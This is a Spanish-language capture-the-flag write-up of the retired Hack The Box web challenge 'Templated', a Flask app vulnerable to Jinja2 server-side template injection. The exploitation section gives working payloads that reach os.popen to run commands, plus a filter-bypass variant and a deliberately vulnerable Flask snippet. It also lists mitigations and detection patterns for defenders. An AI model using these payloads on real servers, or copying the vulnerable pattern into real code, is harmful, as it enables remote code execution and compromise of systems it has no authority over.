---
challenge: Templated
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, jinja2, ssti, rce]
---

# Templated — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Aplicación Flask que saluda por nombre: `/<nombre>` se mete en `render_template_string`. Es **SSTI de Jinja2** en estado puro: `{{7*7}}` devuelve `49` y el salto a RCE se hace llegando a `os` por los globals de una función de Python.

## Enunciado y superficie

```text
http://<IP>:<puerto>/John
```

Devuelve `Hello John`. Un 404 personalizado sugiere que el nombre se renderiza, no solo se imprime.

## Reconocimiento

Un único endpoint: `/<nombre>`. La respuesta es `Hello <nombre>` y un 404 personalizado que también renderiza, señal de que el nombre pasa por una plantilla y no se imprime tal cual.

## Análisis del código

No se entrega el código, pero el comportamiento lo identifica: `render_template_string("Hello " + name)` concatena la entrada **antes** de compilar la plantilla. Las dos pruebas separan motores:

```text
/{{7*7}}     -> Hello 49      (evaluación aritmética)
/{{7*'7'}}   -> Hello 7777777 (Jinja2; Twig daría 49 en ambos)
```

## Explicación del fallo

```python
@app.route("/<name>")
def index(name):
    return render_template_string("Hello " + name)
```

La entrada se compila como plantilla. Hay dos comprobaciones rápidas:

```text
/{{7*7}}        -> Hello 49
/{{7*'7'}}      -> Hello 7777777
```

La primera confirma evaluación aritmética; la segunda, que es Jinja2 (Twig devolvería `49` en ambos casos).

## Reproducción local

Un Flask mínimo reproduce el fallo en local:

```python
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route("/<name>")
def index(name):
    return render_template_string("Hello " + name)
```

## Explotación

En Jinja2 se llega a `os` desde los globals de cualquier función accesible:

```text
/{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}
```

Alternativa sin `config`:

```text
/{{cycler.__init__.__globals__.os.popen('cat /flag*').read()}}
/{{lipsum.__globals__['os'].popen('id').read()}}
```

```text
HTB{<flag>}
```

Si el reto filtra `.` o `_`, `request|attr('application')|attr('__globals__')` permite lo mismo con filtros.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **URL con caracteres raros**: codificar `{`, `}`, `'` y `[` si el cliente se queja; usar `curl --path-as-is` cuando haga falta.
- **Saltos de línea**: `popen(...).read()` imprime la salida con `\n`; a veces hay que recortar con `[:50]`.
- **Doble escape**: si el framework escapa la respuesta, probar `{%print(...)%}`.

- Concatenar entrada en `render_template_string` es RCE, no un saludo.
- Las funciones globales de Jinja2 (`cycler`, `lipsum`, `joiner`) son el puente estándar a `os`.
- Mitigación: `render_template` con variables (`{{ name }}`), nunca plantillas construidas con entrada del usuario; sandbox si de verdad hace falta.

## Mitigaciones y detección

- Pasar la entrada como **variable** (`render_template_string("Hello {{ name }}", name=name)`), nunca concatenada en la plantilla.
- Si el usuario debe poder elegir formato, usar `Template` con sandbox (Jinja2 `SandboxedEnvironment`) o un motor sin acceso a Python.
- Escapar la salida y validar el nombre contra un allowlist.
- Detección: peticiones con `{{`, `{%` o `__class__` en la ruta, y errores 500 con trazas de Jinja2.

## Referencias

- [ssti](../../knowledge/web/ssti.md)
